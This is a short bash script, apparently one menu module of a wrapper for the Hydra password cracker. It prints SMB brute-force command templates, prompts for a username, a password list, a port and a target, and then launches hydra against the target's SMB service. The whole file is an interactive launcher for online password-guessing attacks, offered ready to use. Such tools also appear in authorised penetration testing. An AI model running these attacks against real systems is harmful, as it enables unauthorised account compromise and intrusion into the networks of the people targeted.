#!/usr/bin/env bash

set -euo pipefail

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${BASE_DIR}/common.sh"

cat <<'EOF'
SMB Query
SMB Command

1. Basic SMB attack
hydra -l [username] -P [passwordlist] smb://[target]
2. SMB attack with port
hydra -l [username] -P [passwordlist] -s [port] smb://[target]
EOF

read -r -p $'\nSelect-Options>Hydra>SMB>' select

case "$select" in
  1)
    read -r -p "Input username> " username
    read -r -p "Input password list> " passlist
    read -r -p "Input target> " target
    run_hydra hydra -l "$username" -P "$passlist" "smb://$target"
    ;;
  2)
    read -r -p "Input username> " username
    read -r -p "Input password list> " passlist
    read -r -p "Input port> " port
    read -r -p "Input target> " target
    run_hydra hydra -l "$username" -P "$passlist" -s "$port" "smb://$target"
    ;;
  *)
    echo "Selected command is not available."
    ;;
esac

